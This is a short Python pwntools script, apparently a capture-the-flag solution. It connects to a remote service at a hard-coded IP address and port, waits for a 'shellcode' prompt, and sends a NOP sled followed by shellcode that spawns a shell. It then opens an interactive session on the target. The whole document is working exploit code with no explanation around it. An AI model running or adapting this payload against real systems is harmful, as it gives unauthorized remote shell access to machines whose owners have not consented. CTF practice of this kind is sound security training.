from pwn import*
p = process('./main')
context.arch = 'AMD64'
p = remote('39.101.210.214',10003)
p.sendlineafter('shellcode','\x90'*0x30 + asm(shellcraft.sh()))
p.interactive()
